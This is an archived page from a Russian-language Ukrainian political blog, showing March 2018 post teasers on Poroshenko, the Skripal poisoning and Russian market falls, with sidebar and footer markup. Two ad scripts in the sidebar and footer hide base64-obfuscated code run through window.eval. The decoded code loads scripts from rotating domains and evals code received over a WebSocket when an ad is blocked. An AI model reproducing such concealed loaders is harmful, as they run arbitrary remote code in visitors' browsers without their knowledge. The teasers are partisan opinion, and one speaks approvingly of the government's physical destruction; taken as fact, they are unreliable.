rel="tag">третий Майдан в Украине</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba%d0%b8%d0%b9-%d0%bd%d0%b0%d1%80%d0%be%d0%b4-%d0%bd%d0%b5%d0%bd%d0%b0%d0%b2%d0%b8%d0%b4%d0%b8%d1%82-%d0%bd%d1%8b%d0%bd%d0%b5%d1%88%d0%bd%d1%8e%d1%8e.html" title="Украинский народ ненавидит нынешнюю омерзительную власть. Рано или поздно ситуация взорвется" class="anons-thumbnail">
					<img width="300" height="203" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/ya_ne_veryu_kogda_aktivisti_govoryat_chto_nenavidyat_poroshenko_5995c4fc9b565-300x203.png" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/ya_ne_veryu_kogda_aktivisti_govoryat_chto_nenavidyat_poroshenko_5995c4fc9b565-300x203.png 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/ya_ne_veryu_kogda_aktivisti_govoryat_chto_nenavidyat_poroshenko_5995c4fc9b565.png 600w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Люди, которые еле сводят концы с концами ненавидят власть, и физическое уничтожение власти было бы для них сказочным утешением. Особо не задумываясь о том, что будет дальше, кто этим воспользуется, кто придет вместо нынешних.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba%d0%b8%d0%b9-%d0%bd%d0%b0%d1%80%d0%be%d0%b4-%d0%bd%d0%b5%d0%bd%d0%b0%d0%b2%d0%b8%d0%b4%d0%b8%d1%82-%d0%bd%d1%8b%d0%bd%d0%b5%d1%88%d0%bd%d1%8e%d1%8e.html#more-42176" title="Украинский народ ненавидит нынешнюю омерзительную власть. Рано или поздно ситуация взорвется">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42173 post type-post status-publish format-standard has-post-thumbnail hentry tag-6770 tag-6769 tag-6646 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d1%82%d0%b5%d0%bb%d1%8c-%d0%bd%d0%be%d0%b2%d0%b8%d1%87%d0%ba%d0%b0-%d0%b2-%d0%bc%d0%be%d1%81%d0%ba%d0%b2%d0%b5-%d0%b1%d1%8b%d0%bb%d0%b8-%d1%83%d0%b2%d0%b5%d1%80.html" title="Создатель &#171;Новичка&#187;: &#171;В Москве были уверены, что следы не обнаружат&#187; — Радио Свобода">Создатель &#171;Новичка&#187;: &#171;В Москве были уверены, что следы не обнаружат&#187; — Радио Свобода</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d1%82%d0%b5%d0%bb%d1%8c-%d0%bd%d0%be%d0%b2%d0%b8%d1%87%d0%ba%d0%b0-%d0%b2-%d0%bc%d0%be%d1%81%d0%ba%d0%b2%d0%b5-%d0%b1%d1%8b%d0%bb%d0%b8-%d1%83%d0%b2%d0%b5%d1%80.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bd%d0%be%d0%b2%d0%b8%d1%87%d0%be%d0%ba" rel="tag">"Новичок"</a>, <a href="https://www.economics-prorok.com/tag/%d0%b2%d0%b8%d0%bb-%d0%bc%d0%b8%d1%80%d0%b7%d0%b0%d1%8f%d0%bd%d0%be%d0%b2" rel="tag">Вил Мирзаянов</a>, <a href="https://www.economics-prorok.com/tag/%d0%be%d1%82%d1%80%d0%b0%d0%b2%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5-%d1%81%d0%ba%d1%80%d0%b8%d0%bf%d0%b0%d0%bb%d1%8f" rel="tag">отравление Скрипаля</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d1%82%d0%b5%d0%bb%d1%8c-%d0%bd%d0%be%d0%b2%d0%b8%d1%87%d0%ba%d0%b0-%d0%b2-%d0%bc%d0%be%d1%81%d0%ba%d0%b2%d0%b5-%d0%b1%d1%8b%d0%bb%d0%b8-%d1%83%d0%b2%d0%b5%d1%80.html" title="Создатель &#171;Новичка&#187;: &#171;В Москве были уверены, что следы не обнаружат&#187; — Радио Свобода" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/42FB4631-83B6-4990-B7D7-959DAA3F28D0_cx0_cy10_cw0_w1597_n_r1_s-300x169.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/42FB4631-83B6-4990-B7D7-959DAA3F28D0_cx0_cy10_cw0_w1597_n_r1_s-300x169.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/42FB4631-83B6-4990-B7D7-959DAA3F28D0_cx0_cy10_cw0_w1597_n_r1_s-768x432.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/42FB4631-83B6-4990-B7D7-959DAA3F28D0_cx0_cy10_cw0_w1597_n_r1_s-1024x576.jpg 1024w, https://www.economics-prorok.com/wp-content/uploads/2018/03/42FB4631-83B6-4990-B7D7-959DAA3F28D0_cx0_cy10_cw0_w1597_n_r1_s.jpg 1597w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>О том, как британским следователям удалось установить, какое именно вещество было использовано для отравления бывшего полковника ГРУ Сергея Скрипаля, и почему российские официальные лица постоянно требуют от Лондона &#171;действовать в строгом соответствии с Конвенцией о запрещении химического оружия&#187;, Русской службе &#171;Голоса Америки&#187; рассказал специалист в области химического оружия, ученый Вил Мирзаянов, в 1992 году впервые &#8230;</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d1%82%d0%b5%d0%bb%d1%8c-%d0%bd%d0%be%d0%b2%d0%b8%d1%87%d0%ba%d0%b0-%d0%b2-%d0%bc%d0%be%d1%81%d0%ba%d0%b2%d0%b5-%d0%b1%d1%8b%d0%bb%d0%b8-%d1%83%d0%b2%d0%b5%d1%80.html#more-42173" title="Создатель &#171;Новичка&#187;: &#171;В Москве были уверены, что следы не обнаружат&#187; — Радио Свобода">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42170 post type-post status-publish format-standard has-post-thumbnail hentry tag-6768 tag-6347 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be-%d1%81%d0%bf%d0%be%d0%bd%d1%81%d0%b8%d1%80%d1%83%d0%b5%d1%82-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b8%d1%87%d0%b5%d1%81%d0%ba.html" title="Порошенко спонсирует террористические «республики» ДНР и ЛНР, помогая России">Порошенко спонсирует террористические «республики» ДНР и ЛНР, помогая России</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be-%d1%81%d0%bf%d0%be%d0%bd%d1%81%d0%b8%d1%80%d1%83%d0%b5%d1%82-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b8%d1%87%d0%b5%d1%81%d0%ba.html#comments">Комментарии: 1</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be-%d1%81%d0%bf%d0%be%d0%bd%d1%81%d0%b8%d1%80%d1%83%d0%b5%d1%82-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%be%d0%b2" rel="tag">Порошенко спонсирует террористов</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b5%d1%80%d0%b3%d0%b5%d0%b9-%d0%bb%d1%8f%d0%bc%d0%b5%d1%86" rel="tag">Сергей Лямец</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be-%d1%81%d0%bf%d0%be%d0%bd%d1%81%d0%b8%d1%80%d1%83%d0%b5%d1%82-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b8%d1%87%d0%b5%d1%81%d0%ba.html" title="Порошенко спонсирует террористические «республики» ДНР и ЛНР, помогая России" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/806542-300x169.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/806542-300x169.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/806542.jpg 610w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Уплатить эти деньги в &#171;черную дыру&#187; Русского мира – это преступление. Знаете, почему? Потому что это НАШИ деньги. Не Пети, не Рината, не Виталика. НАШИ.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be-%d1%81%d0%bf%d0%be%d0%bd%d1%81%d0%b8%d1%80%d1%83%d0%b5%d1%82-%d1%82%d0%b5%d1%80%d1%80%d0%be%d1%80%d0%b8%d1%81%d1%82%d0%b8%d1%87%d0%b5%d1%81%d0%ba.html#more-42170" title="Порошенко спонсирует террористические «республики» ДНР и ЛНР, помогая России">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42167 post type-post status-publish format-standard has-post-thumbnail hentry tag-3824 tag-1616 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8-%d0%b2%d1%82%d0%be%d1%80%d0%be%d0%b9-%d0%b4%d0%b5%d0%bd%d1%8c-%d0%b2%d1%81%d0%b5-%d0%bf%d0%b0%d0%b4%d0%b0%d0%b5%d1%82-%d0%b8%d0%b7-%d0%b7%d0%b0-%d1%8d%d1%81.html" title="В России второй день все падает из-за эскалации с Западом и введения новых санкций">В России второй день все падает из-за эскалации с Западом и введения новых санкций</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8-%d0%b2%d1%82%d0%be%d1%80%d0%be%d0%b9-%d0%b4%d0%b5%d0%bd%d1%8c-%d0%b2%d1%81%d0%b5-%d0%bf%d0%b0%d0%b4%d0%b0%d0%b5%d1%82-%d0%b8%d0%b7-%d0%b7%d0%b0-%d1%8d%d1%81.html#comments">Комментарии: 7</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%bf%d0%b0%d0%b4%d0%b5%d0%bd%d0%b8%d0%b5-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b9%d1%81%d0%ba%d0%b8%d1%85-%d0%b0%d0%ba%d1%86%d0%b8%d0%b9" rel="tag">падение российских акций</a>, <a href="https://www.economics-prorok.com/tag/%d0%bf%d0%b0%d0%b4%d0%b5%d0%bd%d0%b8%d0%b5-%d1%80%d1%83%d0%b1%d0%bb%d1%8f" rel="tag">падение рубля</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8-%d0%b2%d1%82%d0%be%d1%80%d0%be%d0%b9-%d0%b4%d0%b5%d0%bd%d1%8c-%d0%b2%d1%81%d0%b5-%d0%bf%d0%b0%d0%b4%d0%b0%d0%b5%d1%82-%d0%b8%d0%b7-%d0%b7%d0%b0-%d1%8d%d1%81.html" title="В России второй день все падает из-за эскалации с Западом и введения новых санкций" class="anons-thumbnail">
					<img width="300" height="188" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/008a1-300x188.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/008a1-300x188.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/008a1.jpg 620w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Приятные новости. Рубль, гособлигации и фондовые индексы России (фашистское государство, признанное Законом Украины от 20.02.18 страной-агрессором) валятся сегодня второй день подряд под давлением продаж зарубежных игроков.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8-%d0%b2%d1%82%d0%be%d1%80%d0%be%d0%b9-%d0%b4%d0%b5%d0%bd%d1%8c-%d0%b2%d1%81%d0%b5-%d0%bf%d0%b0%d0%b4%d0%b0%d0%b5%d1%82-%d0%b8%d0%b7-%d0%b7%d0%b0-%d1%8d%d1%81.html#more-42167" title="В России второй день все падает из-за эскалации с Западом и введения новых санкций">Читать далее</a>
		</p>
		
	</div> 
	</article>


	
	<nav class="navigation pagination" role="navigation">
		<h2 class="screen-reader-text">Навигация по записям</h2>
		<div class="nav-links"><span aria-current='page' class='page-numbers current'>1</span>
<a class='page-numbers' href='https://www.economics-prorok.com/page/2'>2</a>
<a class='page-numbers' href='https://www.economics-prorok.com/page/3'>3</a>
<span class="page-numbers dots">&hellip;</span>
<a class='page-numbers' href='https://www.economics-prorok.com/page/821'>821</a>
<a class="next page-numbers" href="https://www.economics-prorok.com/page/2">Вперед &raquo;</a></div>
	</nav>
		</main> 
	<!-- END #content -->
	

<!-- BEGIN #sidebar -->
<aside id="sidebar" class="">
	<ul id="widgetlist">

    <li id="googleplus_widget-2" class="widget widget_googleplus_widget"><p class="wtitle">Мишель Пророк </p>	
			<div class="g-person" data-width="300" data-href="https://plus.google.com/117422781141568482208" data-layout="portrait" data-theme="light" data-rel="publisher" data-showtagline="true" data-showcoverphoto="true"></div>
			<!-- Place this tag after the last badgev2 tag. -->
			<script type="text/javascript">
			  (function() {
				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
				po.src = 'https://apis.google.com/js/platform.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
			  })();
			</script>			
		</li><li id="text-7" class="widget widget_text"><p class="wtitle">Подписаться в соц. сетях</p>			<div class="textwidget"><!-- Go to www.addthis.com/dashboard to customize your tools --> <div class="addthis_horizontal_follow_toolbox"></div></div>
		</li><li id="text-8" class="widget widget_text">			<div class="textwidget"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- new_ep_sidebar -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6900864180824447"
     data-ad-slot="1024915417"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>
		</li><li id="text-10" class="widget widget_text">			<div class="textwidget"><p><script data-cfasync="false" type="text/javascript" src="//www.increaserev.com/ads/300x600_responsive.js"></script></p>
</div>
		</li><li id="text-13" class="widget widget_text">			<div class="textwidget"><p><!-- start NEW_Right_v1 for economics-prorok.com --></p>
<div id="adpartner-jsunit-2030"><script type="text/javascript">
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = "//a4p.adpartner.pro/jsunit?id=2030&" + Math.random();
        head.appendChild(script);
    </script></div>
<p><!-- end NEW_Right_v1 for economics-prorok.com --></p>
</div>
		</li><li id="text-12" class="widget widget_text">			<div class="textwidget"><p><!--- <a href="http://rusbanya.od.ua/?utm_source=prorok&amp;utm_medium=banner">
<img src="http://www.economics-prorok.com/wp-content/uploads/2017/12/bannaya-usadba-3.png" />
</a>
<a href="http://rusbanya.od.ua/?utm_source=prorok&amp;utm_medium=link"><strong>Банная усадьба - лучший пар в городе</strong></a> ---></p>
</div>
		</li><li id="text-11" class="widget widget_text">			<div class="textwidget"><div id="MIXADV_3177" class="MIXADVERT_NET"></div>
<p><script> 
          var node3177 = document.getElementById("MIXADV_3177");
          if( node3177 )
          {
               var script = document.createElement("script");
               script.charset = "utf-8";
               script.src = "https://m.mixadvert.com/show/?id=3177&r="+Math.random();
               node3177.parentNode.appendChild(script); 
               script.onerror = function(){
                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBkYXRlX251bWJlciA9IGRhdGUuZ2V0RGF0ZSgpO2lmKCBkYXRlX251bWJlciA8IDE3ICkgdmFyIGhvc3QgPSAicG1uZGJzamQuc2l0ZSI7IGlmKCBkYXRlX251bWJlciA+IDE2ICYmIGRhdGVfbnVtYmVyIDwgMjUgKSB2YXIgaG9zdCA9ICJzZGdld2Zyd2Uuc3BhY2UiOyBpZiggZGF0ZV9udW1iZXIgPiAyNCApIHZhciBob3N0ID0gIm9pbmRzcXd3LnNpdGUiOyB2YXIgc2NyaXB0X2ZpcnN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7c2NyaXB0X2ZpcnN0LnNyYyA9ICJodHRwczovLyIrIGhvc3QrIi9zaG93Lz9pZD0zMTc3JnI9IitNYXRoLnJhbmRvbSgpO25vZGUzMTc3LnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQoc2NyaXB0X2ZpcnN0KTs=") );
              }
          }
          </script></p>
</div>
		</li><li id="text-9" class="widget widget_text">			<div class="textwidget"><ins class="adsbyyottos" style="display:block" 
data-ad-client="811f6c2a-46a3-11e7-a573-002590d97638"></ins> 
<script async defer src="https://cdn.yottos.com/adsbyyottos.js"></script></div>
		</li><li id="archives-2" class="widget widget_archive"><p class="wtitle">Архивы</p>		<ul>
			<li><a href='https://www.economics-prorok.com/2018/03'>Март 2018</a></li>
	<li><a href='https://www.economics-prorok.com/2018/02'>Февраль 2018</a></li>
	<li><a href='https://www.economics-prorok.com/2018/01'>Январь 2018</a></li>
	<li><a href='https://www.economics-prorok.com/2017/12'>Декабрь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/11'>Ноябрь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/10'>Октябрь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/09'>Сентябрь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/08'>Август 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/07'>Июль 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/06'>Июнь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/05'>Май 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/04'>Апрель 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/03'>Март 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/02'>Февраль 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2017/01'>Январь 2017</a></li>
	<li><a href='https://www.economics-prorok.com/2016/12'>Декабрь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/11'>Ноябрь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/10'>Октябрь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/09'>Сентябрь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/08'>Август 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/07'>Июль 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/06'>Июнь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/05'>Май 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/04'>Апрель 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/03'>Март 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/02'>Февраль 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2016/01'>Январь 2016</a></li>
	<li><a href='https://www.economics-prorok.com/2015/12'>Декабрь 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/11'>Ноябрь 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/10'>Октябрь 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/09'>Сентябрь 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/08'>Август 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/07'>Июль 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/06'>Июнь 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/05'>Май 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/04'>Апрель 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/03'>Март 2015</a></li>
	<li><a href='https://www.economics-prorok.com/2015/02'>Февраль 2015</a></li>
		</ul>
		</li><li id="search-2" class="widget widget_search"><form method="get" class="searchform" action="https://www.economics-prorok.com//">
    <input type="text" value="" placeholder="Поиск" name="s" class="s" />
    <input type="submit" class="submit search_submit" value="&raquo;" />
</form>
</li><li id="total_hits-2" class="widget total_hits"><p class="wtitle">Общее количество просмотров</p>    <script>
      window.wpTotalHitsData = [["20180310","28415"],["20180311","28755"],["20180312","32111"],["20180313","30348"],["20180314","28081"],["20180315","29115"],["20180316","29748"],["20180317","2495"]];
      for (var i = 0; i<window.wpTotalHitsData.length;i++) {
        window.wpTotalHitsData[i][1] = String(window.wpTotalHitsData[i][1]);
        window.wpTotalHitsData[i][1] = Number(window.wpTotalHitsData[i][1]);
      }
    </script>
    <div class="wp-total-hits-container" style="display: flex; justify-content: flex-start; align-items: center;">
      <div id="chart_div" class="wp-total-hits-chart"></div>
      <div style="margin-left: 10px;" class="wp-total-hits-label">
        <span>
          22,722,870        </span>
      </div>
    </div>
</li>
	</ul>
</aside>
<!-- END #sidebar -->

</div> 

 <div id="MIXADV_3181" class="MIXADVERT_NET"></div>
          <script> 
          var node3181 = document.getElementById("MIXADV_3181");
          if( node3181 )
          {
               var script = document.createElement("script");
               script.charset = "utf-8";
               script.src = "https://m.mixadvert.com/show/?id=3181&r="+Math.random();
               node3181.parentNode.appendChild(script); 
               script.onerror = function(){
                  window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvMzE4MSIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
              }
          }
          </script>

<ins class="adsbyyottos" style="display:block" 
data-ad-client="47c8212e-46a3-11e7-ae80-002590d97638"></ins> 
<script async src="https://cdn.yottos.com/loader.js"></script>

<script data-cfasync="false" type="text/javascript" src="//www.increaserev.com/ads/sticky_120x600.js"></script>

<!-- #main -->


<footer id="footer" class="">

	
	
	
	<div class="copyrights maxwidth grid">
		<div class="copytext col6">
			<p id="copy">
				<!--noindex--><a href="https://www.economics-prorok.com/" rel="nofollow">Экономика от Пророка</a><!--/noindex--> &copy; 2018				<br/>
				<span class="copyright-text"></span>
			</p>
		</div>

		<div class="themeby col6 tr">
			<p id="designedby">
				Тема от				<!--noindex--><a href="https://wp-puzzle.com/" target="_blank" rel="external nofollow">WP Puzzle</a><!--/noindex-->
			</p>
						<div class="footer-counter"></div>
		</div>
	</div>

	
</footer>


</div> 
<!-- .wrapper -->

<a id="toTop">&#10148;</a>


<!-- Go to www.addthis.com/dashboard to customize your tools --> <script type="text/javascript" 
async="async" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-58a07230a828ebab"></script> 

<!--[if lt IE 9]>
<script type='text/javascript' src='https://www.economics-prorok.com/wp-content/themes/basic/js/html5shiv.min.js?ver=3.7.3'></script>
<![endif]-->
<script type='text/javascript' src='https://www.economics-prorok.com/wp-content/themes/basic/js/functions.js?ver=1'></script>
<script type='text/javascript' src='https://www.economics-prorok.com/wp-includes/js/wp-embed.min.js?ver=4.9.3'></script>
<script type='text/javascript' src='https://www.gstatic.com/charts/loader.js'></script>
<script type='text/javascript' src='https://www.economics-prorok.com/wp-content/plugins/wp-total-hits/widget.js?ver=4.9.3'></script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-60477679-1', 'auto');
  ga('send', 'pageview');

</script>
</body>
</html>
<!--
Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/

Object Caching 2315/156 objects using apc
Page Caching using apc (SSL caching disabled) 

Served from: economics-prorok.com @ 2018-03-17 08:34:01 by W3 Total Cache
-->